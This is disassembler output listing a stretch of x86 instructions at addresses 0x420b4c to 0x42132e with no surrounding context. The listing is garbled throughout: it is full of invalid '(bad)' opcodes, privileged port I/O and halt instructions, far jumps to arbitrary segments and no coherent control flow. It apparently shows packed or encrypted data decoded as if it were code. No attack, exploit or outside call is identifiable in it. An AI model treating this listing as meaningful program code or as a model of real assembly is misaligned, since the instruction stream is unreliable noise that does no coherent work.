  420b4c:	out    dx,eax
  420b4d:	push   ebx
  420b4e:	pusha  
  420b4f:	(bad)
  420b53:	ror    BYTE PTR [edx+0x28],cl
  420b56:	adc    DWORD PTR [edx-0x47],0xff98e429
  420b5d:	int3   
  420b5e:	inc    ebp
  420b5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b60:	push   0x1f
  420b62:	jmp    0x653ea7cd
  420b67:	inc    ebx
  420b68:	mov    dl,0x22
  420b6a:	push   ebx
  420b6b:	fmul   DWORD PTR [ebx+0x54]
  420b6e:	adc    ebx,DWORD PTR [ecx+ecx*1+0x2a]
  420b72:	adc    BYTE PTR [ecx+esi*1+0x736e0b49],dl
  420b79:	xchg   BYTE PTR [ecx+0x1595cb53],cl
  420b7f:	cmc    
  420b80:	gs jmp 0x420b21
  420b83:	push   0x2e846bd7
  420b88:	mov    ebx,0x381e9eda
  420b8d:	pslld  mm1,mm0
  420b90:	inc    edi
  420b91:	int3   
  420b92:	aam    0x54
  420b94:	clc    
  420b95:	or     BYTE PTR [ecx],dh
  420b97:	inc    ecx
  420b98:	xor    edi,ebp
  420b9a:	adc    DWORD PTR [ebp+esi*1+0x52],esp
  420b9e:	mov    al,0x8c
  420ba0:	and    eax,0xe9af04b3
  420ba5:	loop   0x420c15
  420ba7:	int3   
  420ba8:	pop    ss
  420ba9:	mov    eax,ds:0x95215465
  420bae:	(bad)  
  420bb0:	fdivr  st(7),st
  420bb2:	fs mov edi,0x4150b16a
  420bb8:	sub    DWORD PTR [edi+0x24c885f4],0x845a2eaf
  420bc2:	imul   ebx,DWORD PTR [esi-0x49],0xffffff8d
  420bc6:	mov    eax,0x70771ce5
  420bcb:	mul    BYTE PTR [edi+0x3e4c69c1]
  420bd1:	jge    0x420c4f
  420bd3:	add    DWORD PTR ds:0xe93b91eb,edx
  420bd9:	addr16 xchg bl,bh
  420bdc:	cmp    eax,0x4f14fc1c
  420be1:	adc    ah,cl
  420be3:	adc    eax,0x2f475f51
  420be8:	sahf   
  420be9:	pushf  
  420bea:	leave  
  420beb:	out    dx,al
  420bec:	add    al,0x5f
  420bee:	in     eax,0x5
  420bf0:	data16 sub cl,al
  420bf3:	xor    DWORD PTR [ebx],0x41ef9878
  420bf9:	jnp    0x420b9b
  420bfb:	cli    
  420bfc:	ret    0xaf7d
  420bff:	cmp    ah,BYTE PTR [esi]
  420c01:	jp     0x420c08
  420c03:	ds pushf 
  420c05:	dec    ecx
  420c06:	hlt    
  420c07:	out    dx,eax
  420c08:	sbb    eax,0xd0e1f30b
  420c0d:	push   esp
  420c0e:	sbb    eax,0xd61d4b71
  420c13:	shl    edx,1
  420c15:	xchg   ebx,eax
  420c16:	push   ebx
  420c17:	sahf   
  420c18:	jb     0x420c19
  420c1a:	test   al,0x6a
  420c1c:	mov    esp,0x99bcccfc
  420c21:	adc    al,0xce
  420c23:	inc    edx
  420c24:	mov    ah,0x41
  420c26:	push   es
  420c27:	xor    eax,0x5a0513d
  420c2c:	(bad)  
  420c2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c2e:	bound  eax,QWORD PTR [ebp-0x51249c6e]
  420c34:	ss dec eax
  420c36:	stos   DWORD PTR es:[edi],eax
  420c37:	(bad)
  420c3b:	daa    
  420c3c:	sub    al,0x4d
  420c3e:	jp     0x420bee
  420c40:	mov    eax,0xe9545e89
  420c45:	outs   dx,BYTE PTR ds:[esi]
  420c46:	outs   dx,DWORD PTR ds:[esi]
  420c47:	out    0xea,al
  420c49:	cmp    al,0xcc
  420c4b:	mov    edx,0x19f26284
  420c50:	std    
  420c51:	mov    ds:0x713811ab,al
  420c56:	icebp  
  420c57:	xchg   esi,eax
  420c58:	xchg   BYTE PTR [edx],bl
  420c5a:	je     0x420c02
  420c5c:	mov    al,ds:0x93543611
  420c61:	mov    ds,WORD PTR [ebp-0x36]
  420c64:	mov    DWORD PTR [edi+0x1b],ecx
  420c67:	dec    edi
  420c68:	(bad)  
  420c69:	into   
  420c6a:	or     esp,edi
  420c6c:	repnz push ss
  420c6e:	lods   al,BYTE PTR ds:[esi]
  420c6f:	ss and al,0xb9
  420c72:	int    0x8c
  420c74:	jno    0x420c9f
  420c76:	xor    edx,DWORD PTR ds:0x3eb313e0
  420c7c:	scas   al,BYTE PTR es:[edi]
  420c7d:	mov    eax,0x8af8268c
  420c82:	cmp    bh,BYTE PTR [eax+0x75]
  420c85:	fnstsw WORD PTR [edx]
  420c87:	mov    dh,0x82
  420c89:	pop    edi
  420c8a:	add    DWORD PTR [eax],edx
  420c8c:	xor    BYTE PTR [esi+0x5c],bl
  420c8f:	das    
  420c90:	les    ecx,FWORD PTR [esi-0x16]
  420c93:	fwait
  420c94:	xbegin 0xfc89d386
  420c9a:	pop    esi
  420c9b:	push   0x3d
  420c9d:	xor    al,0xb0
  420c9f:	out    dx,eax
  420ca0:	jmp    0x195a:0x53c977e3
  420ca7:	mov    ecx,0xfb34bba1
  420cac:	push   edx
  420cad:	jbe    0x420cd0
  420caf:	xor    bh,BYTE PTR [ecx]
  420cb1:	leave  
  420cb2:	fs push ds
  420cb4:	cmp    ebx,ebp
  420cb6:	cld    
  420cb7:	cmp    DWORD PTR [edi+0x51],esp
  420cba:	(bad)  
  420cbb:	std    
  420cbc:	sub    DWORD PTR [edx],ecx
  420cbe:	addr16 push esp
  420cc0:	in     eax,0xb9
  420cc2:	inc    eax
  420cc3:	jp     0x420cf7
  420cc5:	hlt    
  420cc6:	or     eax,0xd853cefd
  420ccb:	xchg   ebx,eax
  420ccc:	int3   
  420ccd:	sub    DWORD PTR [esi-0x74e4d963],edx
  420cd3:	xor    esi,ebx
  420cd5:	sub    bh,dh
  420cd7:	push   ecx
  420cd8:	loop   0x420c5f
  420cda:	ret    0x2256
  420cdd:	shr    DWORD PTR [edx+0x2f],cl
  420ce0:	sbb    DWORD PTR [ebx+0x44],0xa4f4689
  420ce7:	cmp    dl,BYTE PTR [esi-0x9]
  420cea:	jl     0x420d66
  420cec:	(bad)  
  420cee:	cmp    DWORD PTR [edi],esi
  420cf0:	sbb    eax,0x5d330dfd
  420cf5:	mov    ds:0x83db5460,al
  420cfa:	gs mov al,0xe0
  420cfd:	inc    ebp
  420cfe:	mov    edx,DWORD PTR [esi+0x15]
  420d01:	cmp    edx,DWORD PTR [bp+si]
  420d04:	fist   WORD PTR [ebp-0x6950d2a4]
  420d0a:	sub    DWORD PTR [ecx],0x53
  420d0d:	sub    al,BYTE PTR ds:0x47c63034
  420d13:	add    dh,BYTE PTR [ecx+ebp*8]
  420d16:	nop
  420d17:	(bad)  
  420d18:	shl    DWORD PTR [ebx],cl
  420d1a:	gs ins BYTE PTR es:[edi],dx
  420d1c:	xchg   edx,eax
  420d1d:	pushf  
  420d1e:	dec    esi
  420d20:	retf   0xe97
  420d23:	retf   
  420d24:	add    bh,dl
  420d26:	push   0x240ba65e
  420d2b:	test   DWORD PTR ds:0x983d407f,0xf724addd
  420d35:	test   eax,0xe131786c
  420d3a:	cli    
  420d3b:	xchg   ebp,eax
  420d3c:	pop    es
  420d3d:	push   es
  420d3e:	(bad)  
  420d3f:	push   ds
  420d40:	sbb    BYTE PTR [ebp-0x59ddfa2e],cl
  420d46:	les    edi,FWORD PTR [eax+0x2]
  420d49:	ja     0x420d61
  420d4b:	imul   ebx,DWORD PTR [esi],0x2f2fe264
  420d51:	in     eax,dx
  420d52:	clc    
  420d53:	sub    al,BYTE PTR [esi]
  420d55:	sbb    edi,DWORD PTR [ebx-0x79]
  420d58:	xchg   DWORD PTR [eax+0x479d850b],esp
  420d5e:	mov    DWORD PTR [eax+edx*8-0x77b7ef5],esp
  420d65:	clc    
  420d66:	and    edi,DWORD PTR [ebx-0x8]
  420d69:	and    al,0xf0
  420d6b:	sti    
  420d6c:	xor    al,0xac
  420d6e:	xchg   esi,eax
  420d6f:	xor    DWORD PTR [eax-0x7012b969],ebp
  420d75:	outs   dx,DWORD PTR ds:[esi]
  420d76:	ds enter 0xa480,0xd8
  420d7b:	push   0x476142de
  420d80:	iret   
  420d81:	sub    eax,DWORD PTR [ebp+0x59d7ec8]
  420d87:	add    bh,dh
  420d89:	push   es
  420d8a:	in     al,0xd1
  420d8c:	ret    
  420d8d:	xchg   esp,eax
  420d8e:	xchg   ebp,eax
  420d8f:	cs or  al,0xc0
  420d92:	(bad)  
  420d93:	cld    
  420d94:	shr    BYTE PTR [edx+0xa],0xa8
  420d98:	mov    WORD PTR [ecx+0x54deab1c],ds
  420d9e:	les    esi,FWORD PTR [ebp+0x4fca4ee0]
  420da4:	pusha  
  420da5:	dec    edx
  420da6:	pop    esp
  420da7:	in     eax,0x8d
  420da9:	push   ebx
  420daa:	bound  edi,QWORD PTR [esi+0x38f7eb2d]
  420db0:	call   0x3487:0x82304e69
  420db7:	in     al,0xc7
  420db9:	(bad)  
  420dba:	test   eax,0x539d11ab
  420dbf:	xchg   edx,eax
  420dc0:	xchg   edi,eax
  420dc1:	xchg   esi,eax
  420dc2:	push   esp
  420dc3:	sub    dh,al
  420dc5:	aaa    
  420dc6:	or     dh,BYTE PTR [esi]
  420dc8:	add    DWORD PTR [ebx+0x76],0xb83681aa
  420dcf:	xor    ch,BYTE PTR [ebp-0x25]
  420dd2:	push   edi
  420dd3:	push   esp
  420dd4:	push   eax
  420dd5:	pop    ecx
  420dd6:	pop    ds
  420dd7:	jo     0x420d62
  420dd9:	dec    ecx
  420dda:	sahf   
  420ddb:	aam    0xf1
  420ddd:	es dec ebp
  420ddf:	fbld   TBYTE PTR [ebx]
  420de1:	imul   esp,ebp,0xffffff99
  420de4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420de5:	mov    ah,0x8f
  420de7:	aad    0xb8
  420de9:	sti    
  420dea:	fcmovbe st,st(2)
  420dec:	jns    0x420d98
  420dee:	in     eax,0x8e
  420df0:	outs   dx,DWORD PTR ds:[esi]
  420df1:	sub    BYTE PTR [ebx+0x3c1ea457],dl
  420df7:	outs   dx,BYTE PTR ds:[esi]
  420df8:	dec    edx
  420df9:	push   es
  420dfa:	dec    edi
  420dfb:	sub    BYTE PTR [esi-0x3a],ah
  420dfe:	inc    eax
  420dff:	dec    ecx
  420e00:	mov    ds:0xe1ef629f,eax
  420e05:	(bad)  
  420e06:	pushf  
  420e07:	out    0x98,al
  420e09:	and    bh,dh
  420e0b:	add    al,0xfa
  420e0d:	fisubr DWORD PTR ds:0xce05fbc
  420e13:	sub    BYTE PTR [edx-0x3117e549],al
  420e19:	fadd   QWORD PTR [edx+ecx*2]
  420e1c:	inc    edx
  420e1d:	sahf   
  420e1e:	imul   eax
  420e20:	jb     0x420db9
  420e22:	loopne 0x420e6b
  420e24:	fld    TBYTE PTR [ebx-0x71bcbf6]
  420e2a:	mov    ecx,ecx
  420e2c:	push   0xa240a875
  420e31:	(bad)  
  420e32:	cwde   
  420e33:	cdq    
  420e34:	sbb    edx,DWORD PTR [ebx-0x58271dba]
  420e3a:	in     al,dx
  420e3b:	sbb    al,0xc2
  420e3d:	bound  ecx,QWORD PTR [esi]
  420e3f:	xor    ch,BYTE PTR [edx-0xfbb4b7]
  420e45:	cmp    eax,ebp
  420e47:	dec    edx
  420e48:	add    edi,DWORD PTR [edx-0xb1e646c]
  420e4e:	pop    eax
  420e4f:	ins    BYTE PTR es:[edi],dx
  420e50:	xlat   BYTE PTR ds:[ebx]
  420e51:	(bad)  [ebp-0x18905fb4]
  420e57:	js     0x420e25
  420e59:	mov    DWORD PTR [eax-0x7002d88e],eax
  420e5f:	das    
  420e60:	out    0x50,eax
  420e62:	adc    cl,bl
  420e64:	dec    eax
  420e65:	inc    ebx
  420e66:	scas   eax,DWORD PTR es:[edi]
  420e67:	push   edx
  420e68:	adc    dh,dh
  420e6a:	(bad)  
  420e6b:	pop    ds
  420e6c:	clc    
  420e6d:	mov    cl,BYTE PTR [edi]
  420e6f:	xchg   ecx,eax
  420e70:	xchg   esp,eax
  420e71:	(bad)  
  420e72:	rcr    DWORD PTR [bp+di],1
  420e75:	out    dx,al
  420e76:	daa    
  420e77:	or     cl,BYTE PTR [ecx+0x4b]
  420e7a:	out    0xb4,eax
  420e7c:	jno    0x420e52
  420e7e:	adc    BYTE PTR [ebx+edi*8-0x42],bh
  420e82:	in     al,0x65
  420e84:	(bad)  
  420e86:	sahf   
  420e87:	xchg   ebp,ebx
  420e89:	jno    0x420e1b
  420e8b:	js     0x420e11
  420e8d:	rcr    DWORD PTR [edi-0x37],cl
  420e90:	push   ds
  420e91:	pop    esi
  420e92:	inc    eax
  420e93:	ror    dh,1
  420e95:	test   al,0xdf
  420e97:	in     eax,dx
  420e98:	push   0x25fc1996
  420e9d:	pop    eax
  420e9e:	lods   eax,DWORD PTR ds:[esi]
  420e9f:	xchg   ecx,eax
  420ea0:	pop    esi
  420ea1:	dec    ecx
  420ea2:	ficomp DWORD PTR [esi]
  420ea4:	push   ebp
  420ea5:	mov    ah,0xb1
  420ea7:	push   edi
  420ea8:	mov    bh,0xad
  420eaa:	mov    WORD PTR [eax+0x4fa829c0],ss
  420eb0:	mov    cs,ecx
  420eb2:	out    0x40,eax
  420eb4:	inc    esi
  420eb5:	std    
  420eb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eb7:	pop    esp
  420eb8:	xor    DWORD PTR [edi-0x21],0xe6ac99f3
  420ebf:	inc    ecx
  420ec0:	sub    BYTE PTR [ebp+0x5a],cl
  420ec3:	addr16 jg 0x420e8c
  420ec6:	adc    eax,eax
  420ec8:	mov    DWORD PTR [esi-0x7d892af8],0x38ef8d55
  420ed2:	jmp    0x420e69
  420ed4:	test   DWORD PTR [eax+ebx*1],edi
  420ed7:	xor    edx,DWORD PTR [esi-0x80]
  420eda:	imul   edi,DWORD PTR [eax+edx*1],0x6f
  420ede:	rol    bh,0x1f
  420ee1:	mov    bh,BYTE PTR [eax+0x4f]
  420ee4:	test   al,0xd0
  420ee6:	push   esi
  420ee7:	add    BYTE PTR [eax+0x715ede31],bl
  420eed:	sub    DWORD PTR [eax-0x75b91ac7],ecx
  420ef3:	sahf   
  420ef4:	sub    eax,DWORD PTR [esi-0x3]
  420ef7:	lock xor eax,0xbeaaa2e1
  420efd:	inc    ecx
  420efe:	data16 jae 0x420f69
  420f01:	xor    ch,ah
  420f03:	mov    ds:0xc0a04002,eax
  420f08:	loope  0x420efe
  420f0a:	mov    ds:0xeade3b2e,al
  420f0f:	dec    ebx
  420f10:	jge    0x420f2d
  420f12:	sub    BYTE PTR [ebp+0x7acbe4db],al
  420f18:	sub    dl,BYTE PTR [edi+0x57]
  420f1b:	fisttp WORD PTR [edx]
  420f1d:	xchg   esp,eax
  420f1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f1f:	fsub   DWORD PTR [ecx-0x7748f9fc]
  420f25:	pushf  
  420f26:	pop    esi
  420f27:	jecxz  0x420f4f
  420f29:	jle    0x420f2c
  420f2b:	dec    ecx
  420f2c:	fmul   QWORD PTR [edx-0x4e]
  420f2f:	inc    eax
  420f30:	nop
  420f31:	prefetch (bad)
  420f32:	or     eax,0x87bc86ec
  420f37:	jo     0x420fae
  420f39:	ss fsubrp st(5),st
  420f3c:	dec    ecx
  420f3d:	and    eax,0xc0a09930
  420f42:	xor    BYTE PTR [ecx+ebp*4-0x7de88bf5],ah
  420f49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f4a:	pop    esp
  420f4b:	aam    0xdd
  420f4d:	sbb    DWORD PTR [ebx+eax*4],0x6d6fc5d5
  420f54:	xor    esp,esi
  420f56:	bound  ebx,QWORD PTR [edx]
  420f58:	add    esp,DWORD PTR [ebp-0x33]
  420f5b:	mov    cl,0x43
  420f5d:	jle    0x420f1b
  420f5f:	(bad)  
  420f60:	(bad)  
  420f61:	call   FWORD PTR [esi+edi*2]
  420f64:	ret    0x761
  420f67:	or     BYTE PTR [edi],bh
  420f69:	dec    ebp
  420f6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f6b:	xchg   esp,eax
  420f6c:	sub    BYTE PTR [eax],bh
  420f6e:	ss ins BYTE PTR es:[edi],dx
  420f70:	xchg   ebx,eax
  420f71:	les    esi,FWORD PTR [ecx-0x7f4c6a78]
  420f77:	xchg   esp,eax
  420f78:	or     al,0x4e
  420f7a:	sbb    al,0x20
  420f7c:	inc    esp
  420f7d:	ficom  DWORD PTR [ecx-0x1a67634b]
  420f83:	add    BYTE PTR ds:0xdeb935a1,dh
  420f89:	adc    eax,DWORD PTR [ecx+0x57c99ec1]
  420f8f:	inc    esi
  420f90:	add    DWORD PTR [eax+0x4d],0xffffffb3
  420f94:	bound  ecx,QWORD PTR [edi]
  420f96:	adc    edi,DWORD PTR [edx+0x46b18455]
  420f9c:	pusha  
  420f9d:	into   
  420f9e:	mov    edx,0x35b4485d
  420fa3:	push   ebx
  420fa4:	adc    al,0xb1
  420fa6:	test   DWORD PTR [eax],eax
  420fa8:	sti    
  420fa9:	sbb    DWORD PTR [edx+0x1830a8a5],ebp
  420faf:	xchg   edx,eax
  420fb0:	pop    edi
  420fb1:	adc    al,0xde
  420fb3:	loope  0x420f6b
  420fb5:	sub    esp,DWORD PTR [edx]
  420fb7:	test   eax,0x3faea81a
  420fbc:	xor    WORD PTR [edi],bp
  420fbf:	inc    eax
  420fc0:	pushf  
  420fc1:	mov    ebx,0x244839bc
  420fc6:	jecxz  0x420fbc
  420fc8:	dec    esp
  420fc9:	push   eax
  420fca:	ret    
  420fcb:	push   ebx
  420fcc:	adc    eax,ebp
  420fce:	jg     0x421031
  420fd0:	call   0x1ed5453c
  420fd5:	mov    ebx,DWORD PTR [ecx]
  420fd7:	push   ss
  420fd8:	lods   al,BYTE PTR ds:[esi]
  420fd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fda:	pop    edi
  420fdb:	retf   
  420fdc:	mov    dl,dl
  420fde:	xchg   edx,eax
  420fdf:	repz push ss
  420fe1:	(bad)  
  420fe2:	scas   al,BYTE PTR es:[edi]
  420fe3:	mov    ds:0xe64f5c3b,eax
  420fe8:	pop    ss
  420fe9:	lods   al,BYTE PTR ds:[esi]
  420fea:	std    
  420feb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fec:	mov    esi,0xd1d8e682
  420ff1:	mov    ebx,0x48fb5c0a
  420ff6:	std    
  420ff7:	jnp    0x42104b
  420ff9:	add    esp,DWORD PTR [ecx+0x5e41682e]
  420fff:	fcomp  QWORD PTR ds:0xbb3928ba
  421005:	je     0x421071
  421007:	lahf   
  421008:	arpl   WORD PTR [edi-0x4847d5d2],cx
  42100e:	xor    BYTE PTR [eax-0xb199b3d],dh
  421014:	add    al,0xea
  421016:	jmp    0x420ff7
  421018:	mov    ds:0x24d9ea8f,al
  42101d:	mov    ?,WORD PTR [edx+0x4f6a4bf]
  421023:	sbb    dl,BYTE PTR [ecx+0x3f]
  421026:	or     eax,0x922128ef
  42102b:	imul   ebx,DWORD PTR [eax-0x5d],0x7e
  42102f:	xor    DWORD PTR [esi],edi
  421031:	les    edx,FWORD PTR [ebx-0x5a382f14]
  421037:	jmp    0xd01b:0xce793fd4
  42103e:	add    bl,dh
  421040:	pop    esi
  421041:	xchg   ax,ax
  421043:	shl    esp,0xfe
  421046:	div    BYTE PTR [ebx-0x1d]
  421049:	aad    0xbe
  42104b:	cmp    DWORD PTR [edx-0x26c6264f],eax
  421051:	inc    ecx
  421052:	dec    edi
  421053:	mov    ebp,0x512c89ef
  421058:	pop    edx
  421059:	rol    al,cl
  42105b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42105c:	jb     0x4210c8
  42105e:	sub    dh,ch
  421060:	add    al,0xb7
  421062:	add    eax,ebx
  421064:	fnsave [ebx]
  421066:	push   0xffffffeb
  421068:	ret    0xe93e
  42106b:	repz shl BYTE PTR [edx-0x172fa4d7],1
  421072:	add    BYTE PTR ds:0x5743212b,ch
  421078:	daa    
  421079:	das    
  42107a:	cmp    dl,BYTE PTR [edi]
  42107c:	sub    DWORD PTR [edx+edx*8+0x19],edx
  421080:	outs   dx,BYTE PTR ds:[esi]
  421081:	in     eax,0xbd
  421083:	js     0x421011
  421085:	imul   esp,DWORD PTR [edi],0xab41f114
  42108b:	je     0x42108a
  42108d:	das    
  42108e:	and    DWORD PTR [edi+0x3d],ebp
  421091:	or     DWORD PTR [edx],edx
  421093:	test   al,0x3c
  421095:	in     al,dx
  421096:	mov    ebx,0x1618ed5a
  42109b:	aaa    
  42109c:	xchg   esi,eax
  42109d:	cwde   
  42109e:	clc    
  42109f:	pop    ebp
  4210a0:	mov    ecx,0xdb32c5ed
  4210a5:	push   esp
  4210a6:	retf   0x15c7
  4210a9:	push   0x1f
  4210ab:	xor    BYTE PTR [edx-0x4d],dh
  4210ae:	cmp    eax,0xf12afbfd
  4210b3:	cmp    edx,DWORD PTR [esp+eiz*8]
  4210b6:	cs ret 0xe5a4
  4210ba:	(bad)  
  4210bb:	neg    edx
  4210bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210be:	jo     0x4210c8
  4210c0:	in     eax,0x61
  4210c2:	adc    ch,BYTE PTR [edx+0x7a27b9b2]
  4210c8:	ret    0x1c02
  4210cb:	mov    edx,0x634eaf99
  4210d0:	imul   BYTE PTR [ecx-0x5e]
  4210d3:	ins    BYTE PTR es:[edi],dx
  4210d4:	pop    esi
  4210d5:	pop    ds
  4210d6:	push   ebx
  4210d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210d8:	xchg   ebx,eax
  4210d9:	popa   
  4210da:	fidiv  DWORD PTR [eax-0x1944447e]
  4210e0:	fdiv   DWORD PTR [edi-0x15]
  4210e3:	xor    eax,0xc351e4b2
  4210e8:	mov    ds:0x5a4cfe50,eax
  4210ed:	xchg   edi,eax
  4210ee:	pop    esp
  4210ef:	sub    BYTE PTR [esi+0x1e9f17dc],cl
  4210f5:	stos   DWORD PTR es:[edi],eax
  4210f6:	and    eax,0xe8f52a3a
  4210fb:	fnsave [ebx+edx*1+0x43394498]
  421102:	ret    0x8104
  421105:	pop    edi
  421106:	mov    ebp,esp
  421108:	loope  0x42109d
  42110a:	imul   ebp,DWORD PTR [edi+0x3c],0xf72dc37a
  421111:	call   0x1a7d:0x66a11698
  421118:	or     al,0x1a
  42111a:	and    BYTE PTR [edx+esi*1],dh
  42111d:	push   ds
  42111e:	aaa    
  42111f:	retf   
  421120:	aas    
  421121:	fwait
  421122:	push   edx
  421123:	test   eax,0xa7a0a96d
  421128:	sar    WORD PTR [ebp+0x78eac004],cl
  42112f:	repnz mov ebp,cs
  421132:	ins    DWORD PTR es:[edi],dx
  421133:	popf   
  421134:	pop    es
  421135:	outs   dx,DWORD PTR ds:[esi]
  421137:	in     al,0xb4
  421139:	ins    DWORD PTR es:[edi],dx
  42113a:	scas   al,BYTE PTR es:[edi]
  42113b:	or     BYTE PTR [ecx-0x14051d04],al
  421141:	pop    ebp
  421142:	lock popw es
  421145:	xor    BYTE PTR [ebp+0x57],bl
  421148:	fmul   QWORD PTR [eax]
  42114a:	aad    0x5d
  42114c:	cmp    DWORD PTR [eax-0x3d1586f4],ebp
  421152:	fld    DWORD PTR [ecx+0x34350740]
  421158:	cld    
  421159:	scas   al,BYTE PTR es:[edi]
  42115a:	adc    dh,ah
  42115c:	cmp    DWORD PTR [ebp-0x533fe779],eax
  421162:	xor    ecx,DWORD PTR [edx]
  421164:	aas    
  421165:	ret    
  421166:	mov    eax,0x4865b8d0
  42116b:	mov    eax,0x2691dd01
  421170:	pop    edi
  421171:	xor    BYTE PTR [edi-0x145c4aa9],al
  421177:	fwait
  421178:	add    BYTE PTR [ecx+ecx*8+0x34662974],bh
  42117f:	xor    DWORD PTR [ecx+0x7b],esp
  421182:	in     eax,dx
  421183:	or     al,0x77
  421185:	mov    esp,DWORD PTR [edx+0x19]
  421188:	mov    eax,ds:0xf7081c7b
  42118d:	mov    ss,WORD PTR [eax-0x34cc7a72]
  421193:	jg     0x42113a
  421195:	cmp    eax,0xf1d09333
  42119a:	adc    BYTE PTR [edi-0x34826449],0x52
  4211a1:	xor    eax,0x96235670
  4211a6:	and    al,0xfc
  4211a8:	inc    DWORD PTR [edx-0x5525817f]
  4211ae:	fldpi  
  4211b0:	add    edx,DWORD PTR [esi]
  4211b2:	nop
  4211b3:	inc    eax
  4211b4:	inc    eax
  4211b5:	and    ah,BYTE PTR [eax]
  4211b7:	inc    ecx
  4211b8:	clc    
  4211b9:	rol    DWORD PTR [edx-0x56],0x90
  4211bd:	adc    BYTE PTR [esi+edi*4-0x72],0x6
  4211c2:	aam    0xb0
  4211c4:	push   edx
  4211c5:	jmp    0xf48:0x85ad8574
  4211cc:	add    ebp,esp
  4211ce:	cdq    
  4211cf:	ins    DWORD PTR es:[edi],dx
  4211d0:	xor    al,0x30
  4211d2:	ja     0x421212
  4211d4:	mov    cl,0xdf
  4211d6:	adc    ebx,esi
  4211d8:	in     eax,dx
  4211d9:	aad    0x54
  4211db:	bound  edx,QWORD PTR [ebx-0x7a6f024c]
  4211e1:	push   ebx
  4211e2:	leave  
  4211e3:	arpl   WORD PTR [eax-0x43],di
  4211e6:	(bad)  
  4211e7:	sahf   
  4211e8:	not    DWORD PTR [eax+0xbae9ce7]
  4211ee:	mov    dh,0xc5
  4211f0:	push   ebp
  4211f1:	mov    BYTE PTR [ebp+0x3c],al
  4211f4:	xor    eax,0xd533ee0
  4211f9:	lock or cl,BYTE PTR [ebx-0x47]
  4211fd:	jo     0x421254
  4211ff:	adc    BYTE PTR [ecx+0x3df7383a],al
  421205:	hlt    
  421206:	loope  0x42122c
  421208:	cmp    dh,BYTE PTR [esp+eiz*4+0x2c]
  42120c:	(bad)  [ecx-0x67]
  42120f:	imul   ch
  421211:	jbe    0x421260
  421213:	(bad)  
  421214:	fcomp  QWORD PTR [edi+0x6043479e]
  42121a:	inc    edx
  42121b:	jbe    0x421284
  42121d:	idiv   BYTE PTR [edi+0x67]
  421220:	pop    esp
  421221:	addr16 test al,0x92
  421224:	fstp   QWORD PTR [ebp-0x1c059d37]
  42122a:	(bad)  
  42122b:	mov    ds,WORD PTR [edx-0x1170d670]
  421231:	call   0x9fc1607e
  421236:	call   FWORD PTR [esi-0x3ea10227]
  42123c:	and    DWORD PTR [eax+0x1aaa0a7a],eax
  421242:	imul   ebp,ebp,0xbba673ef
  421248:	push   eax
  421249:	sub    eax,0xc45e2b8c
  42124e:	call   0x5cdebefb
  421253:	adc    BYTE PTR [edi-0x66],bl
  421256:	pop    ss
  421257:	inc    esp
  421258:	imul   ebx,esi,0xf7cb5938
  42125e:	add    dh,cl
  421260:	outs   dx,BYTE PTR ds:[esi]
  421261:	imul   edx,esi,0x32773cb7
  421267:	or     DWORD PTR [eax-0x5ab42db8],ecx
  42126d:	lods   al,BYTE PTR ds:[esi]
  42126e:	out    0xdf,eax
  421270:	bound  edx,QWORD PTR [esi-0xf]
  421273:	mov    edx,0x543f9eb5
  421278:	xlat   BYTE PTR ds:[ebx]
  421279:	jle    0x42128e
  42127b:	dec    esp
  42127c:	inc    esi
  42127d:	int3   
  42127e:	pop    ds
  42127f:	dec    esi
  421280:	clc    
  421281:	call   0xac584a40
  421286:	fwait
  421287:	mov    cl,0xd
  421289:	iret   
  42128a:	mov    eax,ds:0xa8568b62
  42128f:	lods   al,BYTE PTR ds:[esi]
  421290:	add    BYTE PTR [eax+0x2f],dh
  421293:	clc    
  421294:	cwde   
  421295:	xor    bl,BYTE PTR [edi-0x6]
  421298:	jge    0x421269
  42129a:	ret    
  42129b:	push   es
  42129c:	sub    eax,0x271d24f3
  4212a1:	dec    eax
  4212a2:	sar    edi,cl
  4212a4:	test   eax,0xe20b1db1
  4212a9:	sbb    esi,DWORD PTR [ecx]
  4212ab:	bound  esp,QWORD PTR [esi+edi*8]
  4212ae:	mov    edi,0xcd8eee5
  4212b3:	lds    ebx,FWORD PTR [ecx-0x1be8bd80]
  4212b9:	cs enter 0x796f,0x5e
  4212be:	jo     0x42130c
  4212c0:	out    dx,al
  4212c1:	out    dx,eax
  4212c2:	xor    BYTE PTR [ebp+0x33],dl
  4212c5:	jmp    0x791f:0x7e0eba15
  4212cc:	fdivr  QWORD PTR [eax+0xe]
  4212cf:	mov    eax,0x70ee91a0
  4212d4:	jmp    0x5614:0x1a070b4c
  4212db:	mov    ebx,0x9accef5e
  4212e0:	jecxz  0x421325
  4212e2:	pop    ss
  4212e3:	loope  0x4212a6
  4212e5:	loope  0x4212a1
  4212e7:	ficomp WORD PTR [edx-0x3ef41f0e]
  4212ed:	mov    cl,0x5b
  4212ef:	jno    0x4212d1
  4212f1:	test   bl,bl
  4212f3:	retf   0x4ca7
  4212f6:	sahf   
  4212f7:	ja     0x42130e
  4212f9:	adc    al,0x7e
  4212fb:	sbb    dh,cl
  4212fd:	xlat   BYTE PTR ds:[ebx]
  4212fe:	inc    eax
  4212ff:	mov    bl,0xe
  421301:	jbe    0x421301
  421303:	or     ch,ah
  421305:	das    
  421306:	xchg   esp,eax
  421307:	(bad)  
  421308:	hlt    
  421309:	dec    edi
  42130a:	inc    edx
  42130b:	imul   eax,DWORD PTR [esi],0xf0c967ba
  421311:	add    eax,0x3df4a01e
  421316:	test   edi,ecx
  421318:	adc    ebp,DWORD PTR [esi-0x6]
  42131b:	ins    DWORD PTR es:[edi],dx
  42131c:	outs   dx,DWORD PTR ds:[esi]
  42131d:	jae    0x4212ff
  42131f:	jecxz  0x421339
  421321:	ret    
  421322:	shl    DWORD PTR [esi+0x7c80f964],cl
  421328:	icebp  
  421329:	mov    ebx,0xa04ac2ca
  42132e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
